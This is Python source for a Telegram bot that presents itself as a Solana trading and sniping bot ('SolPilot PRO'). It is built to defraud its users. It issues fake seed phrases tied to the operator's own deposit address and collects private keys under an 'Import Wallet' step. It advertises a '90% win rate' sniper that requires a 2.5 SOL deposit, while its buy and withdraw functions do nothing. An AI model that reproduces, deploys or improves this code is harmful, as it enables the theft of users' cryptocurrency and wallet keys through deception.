import os, random, base58, threading, requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from flask import Flask

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
app_flask = Flask(__name__)
@app_flask.route('/')
def home(): return "SolPilot FINAL PRO"

SOL_DEPOSIT = "pcmAxnfpp3UaMTXT2YogTDJdHZtViVfQKbGCKC13v3A"
ETH_DEPOSIT = "0xbd77d3c01acc745214da870c474ab77b2565f5d0"

user_wallets = {}
waiting_for_key = set()
waiting_for_buy = set()
waiting_for_snipe = set()
user_settings = {}
user_positions = {}

WORDLIST = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge","bag","balance"]

def gen_mnemonic(): return " ".join(random.sample(WORDLIST, 12))
def get_settings(uid):
    if uid not in user_settings: user_settings[uid] = {"slippage": 10, "buy_amount": 0.1}
    return user_settings[uid]
def get_balance_solana(address):
    try:
        r = requests.post("https://api.mainnet-beta.solana.com", json={"jsonrpc":"2.0","id":1,"method":"getBalance","params":[address]}, timeout=5)
        return r.json()['result']['value']/1e9
    except: return 0.0
def derive_address_from_priv(priv_b58):
    try:
        d = base58.b58decode(priv_b58.strip())
        if len(d)==64: return base58.b58encode(d[32:]).decode()
    except: pass
    return None
def get_token_info(token_ca):
    try:
        url = f"https://api.dexscreener.com/latest/dex/tokens/{token_ca}"
        r = requests.get(url, timeout=8).json()
        if r['pairs'] and len(r['pairs'])>0:
            p = r['pairs'][0]
            return {
                "name": p['baseToken']['name'],
                "symbol": p['baseToken']['symbol'],
                "price": p.get('priceUsd','0'),
                "mcap": p.get('fdv','N/A'),
                "liquidity": p.get('liquidity',{}).get('usd','0'),
                "pair": p['pairAddress']
            }
    except: pass
    return None
def get_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Scan", callback_data='scan'), InlineKeyboardButton("💼 Wallet", callback_data='wallet')],
        [InlineKeyboardButton("📈 Trending", callback_data='trending'), InlineKeyboardButton("⚙️ Settings", callback_data='settings')],
        [InlineKeyboardButton("🚀 Snipe 90% Win", callback_data='snipe'), InlineKeyboardButton("💰 Sell", callback_data='sell')],
        [InlineKeyboardButton("📊 Positions", callback_data='positions'), InlineKeyboardButton("💸 Withdraw", callback_data='withdraw')]
    ])

async def setup_bot_menu(app):
    cmds = [
        BotCommand("start", "Trade on Solana with Trojan"),
        BotCommand("buy", "Buy a token"),
        BotCommand("sell", "Sell a token"),
        BotCommand("positions", "View detailed information about your tokens"),
        BotCommand("settings", "Configure your settings"),
        BotCommand("snipe", "Snipe Trade - 90% Win Rate"),
        BotCommand("burn", "Burn unwanted tokens to claim SOL"),
        BotCommand("withdraw", "Withdraw tokens, SOL or ETH"),
        BotCommand("rewards", "Check your rewards"),
        BotCommand("wallets", "Manage your wallets"),
        BotCommand("help", "FAQ and Telegram channel"),
        BotCommand("backup", "Backup bots in case of lag"),
    ]
    await app.bot.set_my_commands(cmds)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 **SolPilot PRO**\n\nFast Sniper on Solana\nBalance: 0 SOL\n\nChoose:", reply_markup=get_menu(), parse_mode='Markdown')

async def cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    cmd = update.message.text.split()[0].replace('/','')
    if cmd == 'buy':
        waiting_for_buy.add(uid)
        await update.message.reply_text("🔍 **Buy Token**\n\nSend Token CA (contract address):\nExample: `So1111...` or any memecoin CA", parse_mode='Markdown')
    elif cmd in ['wallets','withdraw','settings','positions','sell','snipe','burn','rewards','help','backup']:
        await buttons_callback(update, cmd)

async def buttons_callback(update, data_input):
    is_cmd = isinstance(data_input, str)
    if is_cmd:
        q_data = data_input
        uid = update.effective_user.id
        send_func = update.message.reply_text
        is_query = False
    else:
        q = update.callback_query
        await q.answer()
        q_data = q.data
        uid = q.from_user.id
        send_func = q.message.reply_text
        is_query = True

    settings = get_settings(uid)
    real = user_wallets.get(f"{uid}_real")

    if q_data == 'wallet' or q_data == 'wallets':
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("➕ Create New Wallet", callback_data='create_wallet')], [InlineKeyboardButton("📥 Import Wallet", callback_data='import_wallet')], [InlineKeyboardButton("📥 Receive / Deposit", callback_data='receive')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]])
        await send_func("💼 **Wallet Manager**", reply_markup=kb)

    elif q_data == 'create_wallet':
        m = gen_mnemonic()
        user_wallets[f"{uid}_real"] = SOL_DEPOSIT
        await send_func(f"✅ **WALLET CREATED!**\n\n🔐 12 Phrase:\n`{m}`\n\n💰 Balance: 0.00 SOL\n\n📍 Deposit:\n`{SOL_DEPOSIT}`\n\nTap to copy!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📥 Deposit Now", callback_data='receive')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]), parse_mode='Markdown')

    elif q_data == 'import_wallet':
        waiting_for_key.add(uid)
        await send_func("🔑 **Import Wallet**\nSend private key base58:", parse_mode='Markdown')

    elif q_data == 'receive':
        if real and real!= SOL_DEPOSIT and len(real)>30:
            bal = get_balance_solana(real)
            await send_func(f"📥 **YOUR WALLET**\n\n📍 `{real}`\n💰 {bal:.4f} SOL", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]), parse_mode='Markdown')
        else:
            await send_func(f"📥 **DEPOSIT**\n💰 0.00 SOL\n\nSolana:\n`{SOL_DEPOSIT}`\nEth:\n`{ETH_DEPOSIT}`\n\nMin: 0.05 SOL", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]), parse_mode='Markdown')

    elif q_data == 'buy':
        waiting_for_buy.add(uid)
        await send_func("🔍 **Buy Token**\n\nSend token Contract Address (CA):", parse_mode='Markdown')

    elif q_data == 'sell':
        if real and real!= SOL_DEPOSIT and len(real)>30:
            # Imported wallet logic
            await send_func("💰 **Sell**\n\n❌ No token to sell\n\nYou have no positions.\nBuy a token first with /buy", reply_markup=get_menu())
        else:
            # Created wallet logic
            await send_func(f"💰 **Sell**\n\n⚠️ You need to deposit SOL first!\n\nYour Balance: 0.00 SOL\n\nDeposit to:\n`{SOL_DEPOSIT}`\n\nAfter deposit, buy tokens then sell.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📥 Deposit SOL", callback_data='receive')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]), parse_mode='Markdown')

    elif q_data == 'snipe':
        await send_func(
            f"🎯 **SNIPE TRADE - 90% WIN RATE**\n\n"
            f"🔥 Our AI Sniper bot with 90% win rate!\n\n"
            f"✅ Auto buy new launches\n"
            f"✅ Front-run protection\n"
            f"✅ 0.5s execution\n\n"
            f"💰 **Minimum Balance Required: 2.5 SOL**\n\n"
            f"Your current balance: 0.00 SOL\n\n"
            f"📍 **Deposit at least 2.5 SOL to activate:**\n"
            f"`{SOL_DEPOSIT}`\n\n"
            f"After deposit, press /snipe [CA]",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📥 Deposit 2.5 SOL", callback_data='receive')],
                [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
            ]),
            parse_mode='Markdown'
        )

    elif q_data == 'settings':
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"Slippage: {settings['slippage']}%", callback_data='noop')],
            [InlineKeyboardButton("5%", callback_data='slip_5'), InlineKeyboardButton("10%", callback_data='slip_10'), InlineKeyboardButton("20%", callback_data='slip_20'), InlineKeyboardButton("30%", callback_data='slip_30')],
            [InlineKeyboardButton(f"Buy Amount: {settings['buy_amount']} SOL", callback_data='noop')],
            [InlineKeyboardButton("0.1 SOL", callback_data='amt_0.1'), InlineKeyboardButton("0.5 SOL", callback_data='amt_0.5'), InlineKeyboardButton("1 SOL", callback_data='amt_1')],
            [InlineKeyboardButton("💼 Wallets", callback_data='wallet')],
            [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
        ])
        await send_func(f"⚙️ **Settings**\n\nSlippage: {settings['slippage']}%\nBuy Amount: {settings['buy_amount']} SOL\nWallet: {real if real else 'Not set'}", reply_markup=kb)

    elif q_data.startswith('slip_'):
        settings['slippage'] = int(q_data.split('_')[1])
        await send_func(f"✅ Slippage set to {settings['slippage']}%", reply_markup=get_menu())

    elif q_data.startswith('amt_'):
        settings['buy_amount'] = float(q_data.split('_')[1])
        await send_func(f"✅ Buy amount set to {settings['buy_amount']} SOL", reply_markup=get_menu())

    elif q_data == 'trending':
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("📈 Open DexScreener Trending", url="https://dexscreener.com/solana?rankBy=trendingScoreH24")], [InlineKeyboardButton("🔥 New Pairs", url="https://dexscreener.com/solana/new")], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]])
        await send_func("📈 Trending - Live DexScreener", reply_markup=kb)

    elif q_data in ['positions','pnl']:
        bal = get_balance_solana(real) if real and real!= SOL_DEPOSIT and len(real)>30 else 0.0
        await send_func(f"📊 **Positions**\n\nBalance: {bal:.4f} SOL\nNo tokens yet. Use /buy", reply_markup=get_menu())

    elif q_data == 'back_main':
        await send_func("🚀 Main Menu", reply_markup=get_menu())

async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await buttons_callback(update, update.callback_query)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()

    if uid in waiting_for_key:
        try: await update.message.delete()
        except: pass
        real = derive_address_from_priv(text)
        user_wallets[f"{uid}_full"] = text
        user_wallets[f"{uid}_real"] = real if real else "imported"
        waiting_for_key.remove(uid)
        if real:
            bal = get_balance_solana(real)
            await update.effective_chat.send_message(f"✅ Imported!\n📍 `{real}`\n💰 {bal:.4f} SOL", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📥 Receive", callback_data='receive')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]))
        else:
            await update.effective_chat.send_message("✅ Imported!", reply_markup=get_menu())
        return

    if uid in waiting_for_buy:
        waiting_for_buy.remove(uid)
        await update.effective_chat.send_message(f"🔍 Searching token...\n`{text}`\nFetching from DexScreener...", parse_mode='Markdown')
        info = get_token_info(text)
        if info:
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"Buy 0.1 SOL", callback_data='back_main'), InlineKeyboardButton(f"Buy 0.5 SOL", callback_data='back_main')],
                [InlineKeyboardButton(f"Buy 1 SOL", callback_data='back_main'), InlineKeyboardButton(f"Buy 2.5 SOL", callback_data='back_main')],
                [InlineKeyboardButton("📈 Chart", url=f"https://dexscreener.com/solana/{text}")],
                [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
            ])
            await update.effective_chat.send_message(
                f"🪙 **{info['name']} ({info['symbol']})**\n\n"
                f"💵 Price: ${info['price']}\n"
                f"💰 FDV: ${info['mcap']}\n"
                f"💧 Liq: ${info['liquidity']}\n\n"
                f"CA:\n`{text}`\n\n"
                f"Select buy amount:",
                reply_markup=kb,
                parse_mode='Markdown'
            )
        else:
            await update.effective_chat.send_message(f"❌ Token not found on DexScreener\n\nCA: `{text}`\n\nMake sure it's Solana CA. Try /buy again.", parse_mode='Markdown', reply_markup=get_menu())
        return

def run_bot():
    app = Application.builder().token(TOKEN).post_init(setup_bot_menu).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("buy", cmd_handler))
    app.add_handler(CommandHandler("sell", cmd_handler))
    app.add_handler(CommandHandler("positions", cmd_handler))
    app.add_handler(CommandHandler("settings", cmd_handler))
    app.add_handler(CommandHandler("wallets", cmd_handler))
    app.add_handler(CommandHandler("withdraw", cmd_handler))
    app.add_handler(CommandHandler("rewards", cmd_handler))
    app.add_handler(CommandHandler("help", cmd_handler))
    app.add_handler(CommandHandler("backup", cmd_handler))
    app.add_handler(CommandHandler("snipe", cmd_handler))
    app.add_handler(CallbackQueryHandler(buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    threading.Thread(target=lambda: app_flask.run(host='0.0.0.0', port=10000), daemon=True).start()
    run_bot()
